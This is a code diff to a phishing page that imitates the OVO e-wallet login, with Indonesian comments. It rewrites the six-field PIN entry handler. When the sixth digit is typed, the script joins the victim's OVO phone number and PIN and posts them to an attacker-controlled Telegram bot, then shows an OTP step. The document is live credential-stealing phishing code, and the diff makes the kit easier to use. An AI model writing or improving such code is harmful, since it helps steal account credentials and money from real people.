@@ -216,69 +216,73 @@
                 $("#OTP").hide();
             });
 
-            $("#1").on("input", function () {
-                $1 = $("#1").val();
-                if ($1.length == 1) {
-                    $("#1").attr("readonly", !0);
-                    $("#2").focus();
-                    $("#2").attr("readonly", !1);
-                    $("#2").on("input", function () {
-                        $2 = $("#2").val();
-                        if ($2.length == 1) {
-                            $("#2").attr("readonly", !0);
-                            $("#3").focus();
-                            $("#3").attr("readonly", !1);
-                            $("#3").on("input", function () {
-                                $3 = $("#3").val();
-                                if ($3.length == 1) {
-                                    $("#3").attr("readonly", !0);
-                                    $("#4").focus();
-                                    $("#4").attr("readonly", !1);
-                                    $("#4").on("input", function () {
-                                        $4 = $("#4").val();
-                                        if ($4.length == 1) {
-                                            $("#4").attr("readonly", !0);
-                                            $("#5").focus();
-                                            $("#5").attr("readonly", !1);
-                                            $("#5").on("input", function () {
-                                                $5 = $("#5").val();
-                                                if ($5.length == 1) {
-                                                    $("#5").attr("readonly", !0);
-                                                    $("#6").focus();
-                                                    $("#6").attr("readonly", !1);
-                                                    $("#6").on("input", function () {
-                                                        $6 = $("#6").val();
-                                                        if ($6.length == 1) {
-                                                            $notel = $("#notel").val();
-                                                            $pin = $1+""+$2+""+$3+""+$4+""+$5+""+$6;
+           // Fungsi untuk memindahkan fokus ke field berikutnya
+function moveToNext(current, next) {
+    if (current.val().length >= 1) {
+        current.attr('readonly', true);
+        next.attr('readonly', false);
+        next.focus();
+        
+        // Trigger keyboard muncul di mobile
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            next.trigger('click');
+        }
+    }
+}
 
-                                                             var gabungan = '' + logo + '%0ANomor OVO : ' + $notel + '%0APIN : ' + $pin;
+// Handle input untuk semua field PIN
+$('#1, #2, #3, #4, #5, #6').on('input', function() {
+    var currentId = $(this).attr('id');
+    var currentNum = parseInt(currentId);
+    var nextNum = currentNum + 1;
+    var nextId = '#' + nextNum;
+    
+    if ($(this).val().length >= 1) {
+        if (nextNum <= 6) {
+            moveToNext($(this), $(nextId));
+        } else {
+            // Jika sudah field ke-6, gabungkan PIN dan kirim
+            $(this).attr('readonly', true);
+            var pin = '';
+            for (var i = 1; i <= 6; i++) {
+                pin += $('#' + i).val();
+            }
+            
+            var gabungan = '' + logo + '%0ANomor OVO : ' + $('#notel').val() + '%0APIN : ' + pin;
 
-                                                                    $.ajax({
-                                                            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-                                                            method: `POST`,
-                                                            beforeSend: function() {
-                                                            $("#loading").show();
-                                                            },
-                                                            success: function() {
-                                                            $("#loading").hide();
-                                                            $("#PIN").hide();
-                                                            $("#OTP").show();
-                                                            }
-                                                        });
-                                                        }
-                                                    });
-                                                }
-                                            });
-                                        }
-                                    });
-                                }
-                            });
-                        }
-                    });
+            $.ajax({
+                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+                method: `POST`,
+                beforeSend: function() {
+                    $("#loading").show();
+                },
+                success: function() {
+                    $("#loading").hide();
+                    $("#PIN").hide();
+                    $("#OTP").show();
                 }
             });
+        }
+    }
+});
 
+// Handle backspace/keydown untuk navigasi mundur
+$('#1, #2, #3, #4, #5, #6').on('keydown', function(e) {
+    if (e.keyCode === 8 && $(this).val().length === 0) {
+        var currentId = $(this).attr('id');
+        var currentNum = parseInt(currentId);
+        var prevNum = currentNum - 1;
+        
+        if (prevNum >= 1) {
+            var prevId = '#' + prevNum;
+            $(this).attr('readonly', true);
+            $(prevId).attr('readonly', false).val('').focus();
+        }
+    }
+});
+
+// Fokus ke field pertama saat halaman dimuat
+$('#1').attr('readonly', false).focus();
 
             $("input#setPin").on('input', function() {
                 $notel = $("#notel").val();
